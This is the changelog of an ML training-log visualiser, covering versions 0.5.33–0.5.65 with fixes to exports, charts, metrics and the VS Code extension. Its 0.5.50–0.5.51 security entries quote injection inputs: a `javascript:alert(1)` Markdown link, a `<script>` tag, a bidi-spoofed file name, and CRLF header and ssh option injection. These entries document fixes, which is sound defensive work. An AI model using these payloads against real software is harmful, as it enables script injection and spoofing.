  dependable way out when the panel cannot do what you need.

  Without a Python engine there is nothing to open — no HTTP server exists —
  so it says that and offers the install instructions rather than failing
  silently.

---

## [0.5.65] — 2026-07-30

### Fixed

- **The extension could still only export one GIF.** 0.5.64 added the metric
  picker but gated it on running in a plain browser, so inside VS Code the
  export menu went straight to the primary metric — the other series stayed
  unreachable there.

  The gate was wrong about what the webview blocks. It blocks *downloads*;
  `fetch` works fine, which is how the picker gets its list. The picker now
  runs in all three places the dashboard lives, and the chosen metric travels
  out with the postMessage → through the iframe host bridge → to the extension,
  which appends `?metric=` to the URL it opens. Without that last hop the
  picker would have offered choices that changed nothing.

  Verified in an iframe harness matching the webview's structure: all five of
  the demo run's series are listed, and picking `val_loss` delivers
  `{format:"gif", runId:…, metric:"val_loss"}` to the host.

---

## [0.5.64] — 2026-07-29

### Added

- **The GIF options are reachable from the dashboard.** Metric choice shipped
  in 0.5.62 and the race in 0.5.63, but nothing in the UI could call either —
  the export menu still only fired the default single-run GIF. Both are now
  clickable:

  - Choosing **Animated GIF** asks which metric to animate, listing what the
    run actually recorded. Skipped when there is only one — a menu with a
    single entry is worse than no menu.
  - The comparison view has a **Download race GIF** button that uses the runs
    on screen and the metric already selected there.

### Fixed

- **A submenu that rendered and did nothing.** Found by clicking it rather
  than by reading it: the handler passed `ev.currentTarget` to the menu
  builder *after* an `await`, and `currentTarget` is null once dispatch
  completes. `getBoundingClientRect()` threw after the menu was appended but
  before its click listener was attached — so the menu appeared, looked right,
  and swallowed every click. The element is captured before the await now.

---

## [0.5.63] — 2026-07-29

### Added

- **The multi-run comparison race** — several runs animating together on one
  metric, which is the version that goes in a slide. Designed back in 0.5.48
  and unbuilt until now.

  `GET /api/export/compare/gif?runs=a,b,c&metric=val_accuracy`

  Two decisions worth stating, because both could reasonably have gone the
  other way:

  - **Curves align by epoch, not by frame.** Runs of different lengths finish
    at different moments, and that is the honest picture — a run that reached
    0.95 in 8 epochs did not do what one that took 40 did. Normalising the
    x-axis would hide exactly the thing being compared.
  - **Every run must supply the same metric.** One run's accuracy drawn beside
    another's loss is a chart that invites the wrong conclusion, so a run
    missing the series is refused by name rather than quietly dropped.

  Capped at six runs: each one multiplies the render cost, and a legend stops
  being readable well before that.

  The legend is a scoreboard — it shows what each run has reached *at that
  point in the animation*, not its final value — and it is placed in whichever
  corner the curves do not finish in. Pinned top-right it sat squarely on the
  endpoints of the two leading runs, hiding the finish of the thing being
  compared.

---

## [0.5.62] — 2026-07-29

### Added

- **Choose which metric the GIF animates.** It could only ever show the primary
  metric, because it read story frames — and frames carry the primary series
  and nothing else. The demo run records five (`val_accuracy`, `accuracy`,
  `lr`, `train_loss`, `val_loss`) and four of them were unreachable. A named
  metric now comes from the raw events instead, so any recorded series can be
  the subject.

  - CLI: `epochix export <run> --format gif --metric train_loss`
  - HTTP: `GET /api/export/{run_id}/gif?metric=train_loss`
  - `GET /api/export/{run_id}/gif/metrics` lists the choices, so a picker
    doesn't have to guess.

  An unknown metric names the alternatives rather than just failing.

### Fixed

- **A loss axis was floored at −0.197.** Found by rendering `train_loss` and
  looking at it. Padding is what stops a curve gluing itself to the frame
  edge, but here it put a negative number under a quantity that is never
  negative — the same fault as the accuracy axis that once topped 1.007, and
  as the 123.6% before that. The bounds calculation is now its own function
  with the rule stated and tested: padding may not leave the metric's domain.

---

## [0.5.61] — 2026-07-29

### Added

- **The Epochix mark now rides in the GIF watermark**, set beside the
  `epochix.dev` wordmark so the two read as one lockup rather than as two
  strays in a corner. The GIF is the artefact that travels — it gets posted,
  embedded and screenshotted away from anything else — so the mark belongs on
  it.

  The mark is vendored into the wheel as `epochix/_brand/mark.png` from
  `asset/epochix_mark_512.png`, decoded and scaled once per export rather than
  once per frame. It composites with its own alpha, so the rounded edges stay
  clean against the dark background. A checkout without the vendored asset
  still exports — the watermark simply falls back to the wordmark alone.

---

## [0.5.60] — 2026-07-29

### Fixed

- **The learning curve drew a rising model as a falling line.** On the demo,
  accuracy climbs 0.74 → 0.98 and the story panel says so — while the chart
  showed the blue "val accuracy" line descending. The two disagreed, and the
  chart was wrong.

  Cause, and it came from 0.5.52: the extension creates the run over HTTP but
  never sent `primary_metric`, so the server applied its default of `val_loss`
  while the frames carried accuracy values. The chart reads
  `run.primary_metric` to decide orientation, saw a lower-is-better metric, and
  inverted a series that was already higher-is-better. The extension now sends
  the metric its own frames measure.

  Same shape as the 123.6% bug: the declared metric and the values disagreed.
  When those two drift apart, everything downstream is confidently wrong.

- **The chart legend always read "val accuracy"**, whatever the run's primary
  metric actually was — labelling MAE or perplexity as accuracy, with nothing
  to reveal it. It now shows the real metric.

- **The loss line is inverted, and never said so.** It is deliberately drawn
  upside down so falling loss reads as rising quality, but the legend said only
  "val loss" — so a rising line looked like loss increasing. The legend now
  reads "val loss (inverted — ↑ = lower loss)".

---

## [0.5.59] — 2026-07-29

### Fixed

- **`epochix[all]` did not include GIF export.** The `all` extra expanded to
  `pdf,lightning,hf,llm` — so installing the extra that means "everything"
  still left the GIF button unable to work. It now includes `gif`.

- **A failed export was saved to disk as a JSON file.** An `<a href>` cannot
  read a status code, so a 501 (`gif` extra not installed) or a 400 (run has
  no metric series) downloaded the error body instead of reporting it. The
  dashboard now fetches first, shows the server's own message when the request
  fails, and only downloads on success — using the filename the server chose.

### Notes

`pip install epochix` remains the normal install. The `gif` extra is only
Pillow, and only GIF export needs it; every other format works without it.

---

## [0.5.58] — 2026-07-29

### Fixed

- **The ReDoS regression tests measured how busy the CI runner was.** They
  asserted a flat 1.0 s wall-clock budget; a Windows runner took 2.44 s on
  input that parses in 0.041 s locally, and CI went red on two releases in a
  row with nothing wrong in the parser.

  Catastrophic backtracking is *superlinear growth*, not slowness, and that
  distinction is what the test now measures: quadruple the input and compare.
  A linear scan grows ~4x and a quadratic blow-up ~16x, and the ratio holds
  however slow the hardware is. Confirmed against the original defect — the
  bounded regex in the code today scales 3.9x, the unbounded one it replaced
  scales 15.8x and is caught.

  The remaining absolute-time checks are now documented as hang guards with a
  20 s ceiling, since the bugs they cover took ten seconds or more.

Nothing in the parser changed; it was never slow.

---

## [0.5.57] — 2026-07-29

### Fixed

- **A test fixture wrote to the developer's real run database.** The tests
  added in 0.5.53 set `EPOCHIX_DB_PATH` to point at a temp file — but the
  settings field is `db`, so that env var was ignored entirely and every one of
  those tests ran against whatever database the machine actually uses. It also
  left an on-disk SQLite handle open, which is what turned the Windows CI job
  red. The fixture now uses `Settings(db=":memory:")`, matching the pattern
  already established in `tests/integration/test_api.py`.

  Green on both paths: 511 tests with `--extra dev` alone (what CI runs) and
  527 with the `gif` extra.

---

## [0.5.56] — 2026-07-29

### Fixed

- **Export still did nothing inside the VS Code extension.** 0.5.55 fixed the
  browser by switching to an `<a download>` click, and I verified it in a
  browser — but in the extension the dashboard runs inside the webview's
  **iframe**, and a VS Code webview blocks downloads outright. The anchor click
  was discarded silently, so the menu opened and no file ever arrived. Two
  different environments; only one of them had been tested.

  The iframe is a separate document with no `acquireVsCodeApi` of its own, so
  its only way out is `postMessage` to its parent. The webview host now listens
  for that and forwards it to the extension, which opens the export URL in a
  real browser where the download can land. Verified with an iframe harness
  reproducing the webview's structure: clicking "Animated GIF" inside the frame
  delivers `{type:"export", format:"gif", runId:…}` to the parent.

---

## [0.5.55] — 2026-07-29

### Fixed

- **Export did nothing when you clicked a format.** The menu opened and the
  server answered correctly — verified from the page itself: GIF 104 KB, HTML
  183 KB, JSON 51 KB, Markdown 830 B, all 200 — but the download never
  surfaced. Every export route replies `Content-Disposition: attachment`, and
  `window.open` on an attachment spawns a tab that immediately aborts its own
  navigation (200 OK, then `ERR_ABORTED`). Depending on the browser and its
  popup blocking that is a blank flash, a silent download, or nothing at all;
  inside an embedded browser it is reliably nothing. Downloads now go through a
  temporary `<a download>` click, which downloads in place with no popup.

  Found by driving the actual dashboard in a browser and clicking the button,
  which is how the last several of these should have been found.

---

## [0.5.54] — 2026-07-29

### Fixed

- **The extension could block VS Code's own updater.** The sidecar was spawned
  with no `cwd`, so it inherited the extension host's working directory — on
  Windows, the VS Code *installation* folder. A running process holds a lock on
  its own working directory, which is enough to make the updater fail with
  "the process cannot access the file because it is being used by another
  process". It now starts in the system temp directory. An editor extension
  must not be able to stop the editor updating itself.

- **The sidecar could outlive VS Code.** `ChildProcess.kill()` signals only the
  direct child, and `dispose()` never runs at all if the host dies abruptly. An
  orphaned `epochix serve` was observed still running on a machine with no
  `Code.exe` left — holding its cwd and its port indefinitely. Disposal now
  takes down the whole tree with `taskkill /T /F` on Windows.

---

## [0.5.53] — 2026-07-29

### Fixed

- **"No architecture to display" for a log that plainly had one.** 0.5.52 moved
  parsing into the extension, which meant the server no longer read the file —
  and there was no way to hand the model summary over, because
  `RunCreateRequest` had no field for it. `demo.log` carries a full Keras
  summary (8 layers, 53,002 params) and the Network State panel still showed
  the empty state. Run creation now accepts `architecture`, stores it in
  `run.config` and broadcasts it exactly as the SDK path in `pipeline.py` does,
  and the extension sends what it parsed.

- **The export button only ever produced JSON**, and inside the VS Code webview
  it did nothing at all — the CSP is `default-src 'none'`, so a relative
  `window.open` is silently dropped. It now offers every format the server
  serves and routes through the extension host when running in the webview.

- **Export from the extension always 404'd.** `_handleExport` sent the literal
  string `"current"` as the run id, on the assumption that the server tracked
  an active run. It does not. The panel now remembers the id the sidecar
  assigned, and says so plainly when a run was never persisted.

### Added

- **`GET /api/export/{run_id}/gif`.** `build_gif` had worked since 0.5.48 and
  was reachable from the CLI, but no HTTP route served it — so no button in any
  UI could have called it, which is why there was no GIF option to find.
  Returns `image/gif`, 501 without the `gif` extra, and 400 (not 500) for a run
  with nothing to animate.

- **A format menu on the export button** — Standalone HTML, Animated GIF, PDF,
  Markdown, JSON.

### Notes

The multi-run comparison *race* — an animated GIF across several runs for
presentations — is still not built. `/compare` renders its static chart, and
the single-run GIF is what exists today.

---

## [0.5.52] — 2026-07-29

### Fixed

- **The VS Code sidecar never worked.** Opening a log with the Python engine
  installed always fell back to the built-in engine with "could not reach the
  Python engine (No run_id in response)", so saved run history was silently
  lost on every install.

  The extension POSTed the log's path to `/api/parse` — an endpoint that was
  never implemented. The server answered 404, and a 404 body
  (`{"detail":"Not Found"}`) is valid JSON: the client's `JSON.parse` succeeded,
  found no `run_id`, and reported the failure as an unreachable engine. The
  client also never checked `res.statusCode`, so every HTTP error looked
  identical.

  The extension now parses locally and persists through the endpoints that
  exist — `POST /api/runs`, then `POST /api/runs/{run_id}/event`. Sending the
  parsed data rather than the path is the better shape anyway: the extension
  already reads the file, so the server needs no route that opens an arbitrary
  path on the host.

- **A failed sidecar call now names its own cause** (`POST /api/x → HTTP 404`)
  instead of reporting every error as a missing `run_id`.

### Added

- `tests/unit/test_extension_server_contract.py` — asserts every `/api` URL in
  the extension resolves to a real route in the app's OpenAPI schema. Verified
  to fail on the original bug before being committed.

  The existing suite missed this for a reason worth recording: the sidecar test
  *mocks* `parseLogFile`, so it exercised the fallback while stubbing out the
  call that was broken. A green test for a degraded path is not evidence the
  primary path works.

---

## [0.5.51] — 2026-07-28

### Security

Completes the 0.5.50 audit by widening it past the export/render surface to
every place the library touches the host.

- **A run id could inject a response header.** The export routes echoed
  `run_id` straight into `Content-Disposition`. A quote ends the filename
  value; a CRLF ends the header. This was safe only *indirectly* — the API
  constrains the charset at run creation — but a run inserted through the CLI
  or SDK carries whatever id it was given, so the id is now sanitised at the
  point of use rather than trusted to have been checked upstream.

Audited in this pass and found already correct, so unchanged:

- **The SSH ingester** builds `argv` for `create_subprocess_exec` (never a
  shell), `shlex.quote`s the remote path, and explicitly rejects a `-`-leading
  target so it cannot reach ssh's option parser.
- **The LLM fallback parser cannot silently exfiltrate a training log**:
  `llm_enabled` defaults to `False`, `sniff()` always returns `0.0`, and
  `is_available()` requires an explicitly configured URL or key — a localhost
  Ollama default deliberately does not count as configured.
- **No archive extraction and no unsafe deserialisation** anywhere in the
  package: no `zipfile`/`tarfile`/`extractall`, no `torch.load`, `pickle`,
  `joblib`, `marshal` or `dill`, so there is no zip-slip or gadget-chain
  surface to guard.
- **The WebSocket is token-gated**, and the ingest models bound every string
  and numeric field.

---

## [0.5.50] — 2026-07-28

### Security

A training log is untrusted input. It is written by a process that, on a shared
box or in a repo you cloned, you did not necessarily control — and the run name
it yields then crosses into an image rasteriser, a Markdown document and an
HTML page. This release closes the places where that name stopped being text.

- **GIF export could be made to exhaust memory.** `build_gif` took `width` and
  `height` straight from the caller with no bound. A 20000×20000 request is
  ~1.2 GB *per frame* across dozens of frames; it never returned. Dimensions are
  now clamped to 320–2400 and `fps` to 1–30, before anything is allocated.
  `build_gif` is a public function and is due to become reachable over HTTP, so
  a caller-supplied size must never decide an allocation.
- **A run name could disguise itself in a GIF.** Control characters and Unicode
  bidi overrides passed through to the canvas — `safe<U+202E>gnp.exe` renders as
  `safeexe.gnp`, a label that lies about what it is. Names are now stripped of
  the `Cc`/`Cf` categories, whitespace-collapsed and capped at 80 characters.
- **A run name could inject markup into a Markdown export.** A name like
  `[click](javascript:alert(1))` exported as a working link, `<script>` survived
  into any renderer allowing inline HTML, and a bare `|` silently restructured
  the metrics table. Names and metric keys are now escaped for the context they
  land in — backslash escapes outside code spans, backtick removal inside them,
  since a backslash means nothing between backticks.
- **Non-finite metric values could hang the rasteriser.** A diverged run stores
  NaN/Inf, which propagated into pixel coordinates. They are now filtered out.

Also fixed: a 100k-character run name took 4.6 s to render. It now takes 0.58 s.

Audited and found already correct, so unchanged: the HTML exporter's `<script>`
data island (escapes `<`, `>`, `&`), the dashboard's `innerHTML` sinks (all
`_esc`-wrapped), the SQLite layer (its only interpolated identifiers are
hardcoded literals), and the default same-origin CORS posture.

### Added

- Two adversarial test files — `test_gif_export_hardening.py` and
  `test_export_injection.py` — asserting each property above.

---

## [0.5.49] — 2026-07-27

### Fixed

- **0.5.48 turned the type-check job red.** `mypy --strict` passed locally
  because Pillow was installed there, but CI type-checks with `--extra dev`
  only, where the optional `gif` dependency is absent and the `PIL` import
  cannot resolve. Added the same `ignore_missing_imports` override the other
  optional integrations already use.

  Verified by reproducing CI's environment exactly — syncing *without* the
  extra — rather than trusting a local pass.

---

## [0.5.48] — 2026-07-27

### Added

- **`--format gif`** — an animated learning curve you can post. The run's
  primary metric draws itself epoch by epoch and settles on a final frame
  carrying the run name, the metric, the final value and the grade, because
  that frame is what most platforms show as the still preview.

  ```bash
  pip install 'epochix[gif]'
  epochix export <run_id> --format gif --output run.gif
  ```

  Rendered **server-side with Pillow**, deliberately: capturing the live canvas
  would make the CLI depend on a headless browser, which is slow, fragile in CI
  and impossible on a machine with no display.

  Design decisions worth knowing:

  - **Fixed frame budget.** A 20-epoch and a 2000-epoch run produce animations
    of the same length; long runs are subsampled, and the last frame always
    shows the complete curve.
  - **Flat palette.** GIF quantises to 256 colours and the dashboard's
    gradients band badly, so the export has its own solid-colour theme — which
    also reads better at the size these are actually viewed.
  - **Bounded metrics keep an honest axis.** Padding the range once topped an
    accuracy axis at **1.007**, a value no model can reach. Metrics that live
    in [0, 1] are clamped; unbounded ones are not, or their curve would be
    crushed.
  - One metric only. A run whose early frames measured something else cannot
    produce a curve that joins a loss to an accuracy.

  Missing the extra exits 1 with an actionable message and no traceback, the
  same as `[pdf]`.

---

## [0.5.47] — 2026-07-27

0.5.46 recognised twenty new metrics. It turned out only one of them could
actually affect anything.

### Fixed

- **A recognised metric could not reach the grade.** Only segmentation was
  wired into task detection and primary-metric selection, so the other
  nineteen parsed, charted, and then had no effect. A run whose MAPE improved
  from 0.31 to 0.08 and one whose MAPE *worsened* from 0.08 to 0.31 both came
  back `task=custom, primary=val_loss, grade=D` — indistinguishable. AUC, R²,
  MAPE, PSNR, SSIM, WER, CER, BPC, top-5 accuracy and mAP75 now have task
  signals and can be a run's primary metric.

- **R² was graded backwards.** Direction was decided per *task*, and R² lives
  in `regression` alongside error metrics, so the task-level answer said
  "lower is better" and an improving run scored *worse* than a worsening one.
  Direction is a property of the metric, so the metric's own answer now wins
  and the task is only the fallback.

- **PSNR and WER were graded against a scale built for something else.** The
  `generative` bands are calibrated for FID and the `nlp` bands for
  perplexity, so both graded A+ whichever way they moved. A run whose primary
  metric is not its task's canonical one is now graded on improvement from
  baseline instead of against thresholds that do not apply to it.

Ten metrics are covered by a new test that runs each one improving *and*
worsening and requires the grades to differ in the right direction — the check
that exposed all three faults.

---

## [0.5.46] — 2026-07-27

Coverage, measured and then closed. 22 of 23 metrics that appear routinely in
real logs were unrecognised and fell into the generic `custom` bucket.

### Added

- **Segmentation is a supported task.** IoU, mIoU, Dice, Jaccard and pixel
  accuracy previously all landed in `custom`, so a U-Net run was graded on the
  generic trajectory scale with no idea what it measured. It now detects as
  segmentation, takes mIoU/IoU/Dice as its primary metric, gets its own phase
  narratives in English, Persian and French, and is graded on a scale
  appropriate to IoU — where 0.75 is a strong result, not the mediocre one the
  accuracy bands would have called it.

- **47 canonical metric keys, up from 27** (103 aliases, up from 58): AUC and
  PR-AUC, top-5 accuracy, specificity, R², MAPE, PSNR, SSIM, LPIPS, WER, CER,
  BPC, NDCG, MRR, mAP75 and gradient norm.

### Fixed

- **`MAPE` was classified as higher-is-better.** It is an error metric, so a
  model whose percentage error grew would have been graded as improving. The
  direction table now matches exact canonical keys before falling back to
  substring hints, which is what got this one backwards.

- **The extension diverged from Python on split metrics.** `canonicalise` had
  no prefix handling, so `val_iou` never reached `IoU` and a segmentation log
  produced **zero frames** in the extension while working correctly through the
  Python package. It also demanded one exact primary key per task, so a run
  logging `IoU` but not `mIoU` rendered nothing; it now walks the same
  preference list Python does. Both sides now agree: 10 frames, grade A−, on
  the same log.

---

## [0.5.45] — 2026-07-27

The rest of the audit: the remaining quantitative visuals, checked against what
they actually compute.

### Fixed

- **Radar axes were mislabelled.** An axis reading `1 − MAE` plotted
  `1 − MAE/30`; `1 − Perplexity` plotted `1 − PPL/200`. A reader backing the
  metric out of the chart would be wrong by the scale factor. An unbounded
  metric needs *some* reference to reach a 0–1 axis, and these references are a
  judgement call — so the divisor is now part of the label
  (`1 − MAE/30`, `1 − PPL/200`, `1 − EER/0.5`, `1 − box_loss/4`).

- **The grade never said what it does not know.** It is an absolute threshold
  per task type, so 85% on MNIST and 85% on ImageNet grade identically. The
  hero panel now states that, and points at the parts that *are* reliable — the
  trend and the best-epoch call. Localised to Persian and French.

### Checked and found sound — no change needed

- **Phase boundaries.** These are gated on real improvement, not the clock: a
  run stuck at chance level stays in "learning" through epoch 20 rather than
  marching to "mastering". Verified by driving `compute_phase` with a
  plateaued and a healthy series. *(An earlier note in this project claimed
  otherwise; that claim was wrong.)*

- **Network-state node brightness.** Uses real captured activations when the
  SDK recorded them, and when it did not, the legend says
  "schematic · illustrative, not measured weights". A labelled schematic is
  honest; this one is labelled.

---

## [0.5.44] — 2026-07-27

An audit of the diagnostics formulas, prompted by a fair question: are these
numbers actually sound? Four were not.

### Fixed

- **The stability metric measured the learning trend, not instability.** It took
  σ of the first differences of the loss — but in a healthy run those
  differences are dominated by the loss legitimately falling. On our own demo it
  scored a textbook-clean run at 47% ("noisy"), which is *worse* than a
  deliberately noisy version of the same run at 46%. The metric was
  **non-monotonic in the thing it claimed to measure.** It now differences twice
  to cancel the trend (÷√2 for the variance that differencing doubles), which
  puts the clean run at 12% and the noisy one at 38% — the right way round.

- **The overfitting ratio exploded as the model fitted.** Dividing the
  train/val gap by the *training loss* means a run at train 0.01 / val 0.02 —
  an excellent result — scores 100% and reads "it memorises training data".
  The gap is now normalised by the mean level of the two losses, so the ratio
  stays meaningful as both approach zero.

- **"Diverging — try a lower learning rate" was usually the wrong advice.** A
  rising *validation* loss while training loss still falls is overfitting, and
  the fix is to stop earlier, not to change the step size. Only when both are
  rising is the learning rate the likely cause. The two cases are now
  distinguished and told apart in the text.

- **The health score is a composite, not a measurement.** It is a weighted blend
  of the four verdicts with weights that are a judgement call, and it looked
  like an instrument reading. It now says so on the card.

---

## [0.5.43] — 2026-07-27

### Added

- **Comparison now explains itself.** Overlaying two curves is what every tool
  does; saying what the overlay *means* is the part that was missing. `compare`
  and `GET /api/compare` now return a narrative built from facts the engine
  already tracks:

  > lower-lr finished ahead of baseline: 0.8970 against 0.8460 (val_accuracy).
  > baseline peaked at 0.8650 on epoch 7 and ended worse, at 0.8460. Had it
  > stopped at its best the gap would have been 0.0320 rather than 0.0510.
  > lower-lr was still improving when it stopped, so its result is probably not
  > its ceiling.

  Localised to Persian and French, with a test asserting every translation
  keeps the same placeholders — a locale that drops one would otherwise fail
  silently while English passed.

  Three honesty rules are enforced by tests rather than by convention:

  - Runs measured on **different primary metrics are refused**, not compared.
  - A gap **no larger than the runs' own epoch-to-epoch movement** is reported
    as no meaningful difference. Two seeds of one config must not produce a
    winner.
  - Nothing claims causation. It reports what the curves did; it does not blame
    a hyperparameter for it.

  Early frames that predate task detection are dropped from a trajectory, so a
  comparison can never join a loss to an accuracy — the 0.5.30 lesson applied
  to a second surface.

---

## [0.5.42] — 2026-07-27

"Diagnostics appear once metrics arrive…" — they never did.

### Fixed

- **Without the Python package, half the dashboard was permanently empty.** The
  extension sent story frames and nothing else: there was no `metrics` message
  in the protocol at all. Training Diagnostics, Metric Spread, Value Histograms
  and the learning-rate chart all read `store.metrics`, so on the bundled demo
  they showed their empty state forever. The standalone engine now exposes its
  metric events in the same shape as the server's `/api/metrics`, and sends
  them incrementally as parsing proceeds as well as with `init`.

- **`Total params: 53,002` was charted as a metric worth 53.** The comma
  truncated it. The Python parsers stopped doing this in 0.5.39, but the
  TypeScript parsers kept their own skip lists — `keras.ts` knew only
  `s`/`ms`/`us` — so the extension still did. Both sides now share one table
  (`_never_metrics.py` / `neverMetrics.ts`).

- **The extension merged training accuracy into validation accuracy.** Its
  canonical map aliased `accuracy` → `val_accuracy`, so a 20-epoch run produced
  40 "val_accuracy" points, half of them training numbers plotted as
  validation. They are now distinct, matching the Python normaliser.

---

## [0.5.41] — 2026-07-27

Three display faults, reported from a screenshot.

### Fixed

- **The phase journey drew every phase twice.** `init` replays the whole frame
  snapshot, but the webview bridge cleared `metrics` and `architecture` and left
  `frames` alone — so any repeated ready handshake appended the run on top of
  itself, and the ribbon showed `ep 1, 2–7, 8–13, 14–20` followed by the same
  four again. `init` now resets the stream, and `pushFrame` ignores a `seq` it
  already holds, which also covers a reconnect replaying from `last_seq`.

- **The sidebar sparkline charted two different metrics as one line.** It
  plotted `primary_metric_value` across frames without checking
  `primary_metric` — the field added in 0.5.30 precisely because an early frame
  can predate task detection. On the bundled demo that meant frame 1's training
  `accuracy` was joined to nineteen frames of `val_accuracy`. It now plots only
  the metric most frames actually measured.

- **The sparkline stated no scale.** It auto-scales to its own min and max with
  no axis, so a 0.7-point wobble and a total collapse draw an identical shape.
  It now carries the band it was scaled to (`0.838 – 0.989`) beneath it and in
  its accessible label, so the shape reads as relative rather than absolute.

- **Phase labels truncated to "A…" when a phase was short.** Segments were
  sized purely by epoch share, so a one-epoch phase became a sliver with an
  unreadable name. Segments now have a legible minimum width and the ribbon
  scrolls horizontally instead — verified at 375 px that the labels stay whole,
  the ribbon scrolls, and the page itself does not overflow sideways.

---

## [0.5.40] — 2026-07-27

0.5.39 added architecture detection to the standalone engine and it still did
not appear. Two bugs downstream of it, both found by running the published
extension rather than the code.

### Fixed

- **The parse latched on the first layer.** A log is read line by line, so the
  first successful parse of a model summary sees exactly *one* row — and that
  result was kept, discarding the seven layers still streaming in. An
  eight-layer network was reported as a one-layer network. The scan now keeps
  the longest parse across the whole window instead of stopping at the first
  success.
- **The architecture message could arrive before anyone was listening.** It was
  posted on its own, but the webview only attaches its message handler after
  the `ready` handshake, so an early post was dropped. It now also rides along
  in the `init` payload, which is sent in response to `ready`.

---

## [0.5.39] — 2026-07-27

The demo is the first thing anyone sees, and three separate things were wrong
with it.

### Fixed

- **The standalone engine had no architecture support at all.** The Network
  State panel read "no architecture to display" for every log, including our
  own demo — whose first twelve lines are a Keras model summary. The demo
  command's comment even claimed the panel "lights up". It does now: a new
  TypeScript parser reads Keras `model.summary()` and torch `print(model)`,
  and the layers reach the webview over a new `architecture` message.

  A torch repr carries no parameter counts, so those layers report the count as
  *unknown* rather than as `0`.

- **`Total params: 462,410` was charted as a metric worth 462.** The comma
  truncated it, and the Keras parser kept its own three-entry skip list that
  knew nothing about model summaries — so the bundled demo shipped with a
  fabricated flat series on its chart. Every parser now shares one
  `NEVER_METRICS` table, so a key filtered in one cannot leak through another.

### Changed

- **A better demo.** The old log had 11 epochs, no learning-rate schedule, and
  a truncated summary. The new one comes from an actual training run — a small
  CNN on scikit-learn's `digits`, 1797 real handwritten images — and gives 20
  epochs, a real cosine LR schedule so the LR chart renders, 8 layers totalling
  53,002 real parameters, and a final 98.0% validation accuracy. The script
  that produced it ships alongside as `media/demo_source.py`, so every number
  is reproducible rather than asserted.

---

## [0.5.38] — 2026-07-27

Follow-up from re-running the cold install test against 0.5.37.

### Fixed

- **The install hint fired in untrusted folders, where it was wrong.** With
  0.5.37 correctly declining to start the sidecar in an untrusted folder, the
  "install the `epochix` Python package" notification appeared for users who
  already had it installed — the reason was trust, not absence. Worse, it set
  the one-shot dismissal flag, so the genuinely useful hint would never appear
  again after the folder was trusted. It is now skipped entirely while a folder
  is untrusted.
- The hint's "Install guide" button pointed at a GitHub README anchor; it now
  opens <https://epochix.dev/quickstart/>.

---

## [0.5.37] — 2026-07-27

Found by installing the published extension on a clean machine and clicking the
onboarding button, rather than testing the code that implements it.

### Fixed

- **The extension was invisible in a new folder.** VS Code opens any folder a
  user has not trusted in Restricted Mode, and an extension that does not
  declare `capabilities.untrustedWorkspaces` is disabled there. So a newcomer
  who installed Epochix and opened their project saw no activity-bar icon and
  no "Try a Demo Run" button at all. The extension now declares `limited`
  support and works in an untrusted folder using its built-in engine.

  It deliberately does **not** claim full support: starting the Python sidecar
  means executing an interpreter that may have been resolved from the folder
  itself, and a hostile repository can ship a `.venv`. Untrusted folders get
  the standalone engine, which is pure JavaScript in the extension host.

- **A stale Python package silently downgraded the whole product.** The
  launcher resolves whichever interpreter it can find, and on the test machine
  that was one carrying epochix **0.5.0** — so extension 0.5.36 was driving a
  36-release-old backend. Everything appeared to work while quietly missing
  features: the architecture panel just read "no architecture to display".
  The sidecar's version is now checked against the extension's on startup, and
  a mismatch says so and points at the fix.
- Several CLI tests assumed port 7860 was free, so they failed on any machine
  already running an epochix server — which the port guard added in 0.5.32
  turned from a silent hang into a visible failure. They now bind a free port.

---

## [0.5.36] — 2026-07-27

**`epochix demo` crashed on Windows.** The first command the docs tell a
newcomer to run, and the one the extension's demo button is modelled on.

### Fixed

- **`epochix demo` died with `UnicodeEncodeError` before printing anything.**
  It emitted a raw `▶`, which a Windows console — still cp1252 by default —
  cannot encode. 0.5.29 added an ASCII-fallback helper for exactly this, but
  `demo` never used it, and neither did `epochix open` or the SDK's comparison
  output. Found by cold-installing the published wheel and running the
  quickstart, not by reading the code.
- **A run name the console cannot encode killed `run` and `list`.** Run names
  are user data, so transliterating our own decorations cannot help: a Persian
  name — entirely ordinary, since epochix ships Persian localisation — aborted
  both commands. Output streams are now hardened so an unencodable character
  degrades to `?` instead of ending the command.
- The symbol helper moved to `epochix.console` (`console_safe`,
  `console_symbols`, `harden_streams`) so the SDK no longer has to import the
  CLI to print an arrow.

Regression tests drive the real CLI under `PYTHONIOENCODING=cp1252`, so they
reproduce a Windows console on any OS and run in CI. Verified they fail against
the previous code.

### Changed

- The Marketplace listing gets a `galleryBanner` so the header matches the icon.

---

## [0.5.35] — 2026-07-27

### Added

- **The VS Code extension is linted.** `npm run lint` has been in
  `package.json` since the extension existed, but there was no ESLint config
  file, so it always failed and CI never ran it — the half of the codebase with
  the most shipped bugs had no static checking beyond `tsc`. Added an ESLint 8
  config with type-aware rules, and wired **lint and typecheck into CI** so it
  cannot rot again silently.

  The rules were chosen for bugs this repo has actually had:
  `no-floating-promises` (an awaited `showInformationMessage` once hung a host
  test for 60 s), `no-misused-promises`, `await-thenable`, `require-await`.

- **[Writing your own training loop](https://epochix.dev/training-loop/)** — a
  page for the most common way epochix is used, and previously the least
  documented. Covers the print-only path, the log shapes that are recognised,
  how metric naming drives task detection and grading, why `flush=True` matters
  when piping, and what deliberately is *not* charted.

### Fixed

- Three `eslint-disable` comments in `TerminalWatcher.ts` named
  `@typescript-eslint/no-require-imports`, a rule that never applied; the rule
  that fires is `no-var-requires`. They had been silently inert — which is what
  you would expect of disable comments written against a linter that had never
  run.

---

## [0.5.34] — 2026-07-27

`epochix.dev` is live. This sweeps up the references 0.5.33 missed.

### Fixed

- **The Marketplace listing still linked to the dead host.** The extension's
  own README — which *is* the listing page — pointed at `docs.epochix.dev`,
  which has no DNS record and never had one. Its `homepage` field pointed at
  the GitHub README rather than the site.
- The README's docs link was labelled `docs.epochix.dev` while pointing at
  `epochix.dev`, so the visible text advertised a dead host.
- `RELEASING.md` still described buying the domain as a to-do, and instructed
  a `docs.` subdomain — which would have been permanently ineligible for
  Marketplace verified-publisher status, since that rejects subdomains.
  It now records the live setup instead.
- Stale mentions in `ARCHITECTURE.md`, `TASKS.md`, and the docs workflow.

---

## [0.5.33] — 2026-07-27

Every documentation link this project published was broken.

### Fixed

- **The docs host never resolved.** `docs.epochix.dev` appeared in the README,
  in `mkdocs.yml`, and as the `Documentation` URL on the PyPI and Marketplace
  listings, but was never registered — the site has been served from
  `epochix-dev.github.io/epochix/` all along. Everything now points at
  `epochix.dev`, and `docs/CNAME` claims it.
- **Four of the six linked doc paths were 404 even on the working site.**
  `/getting-started/` and `/sdk/` never existed under those names (they are
  `/quickstart/` and `/api/`), and `/cli/` and `/config/` did not exist at all.
  Both missing pages are now written, from the actual command and settings
  definitions.
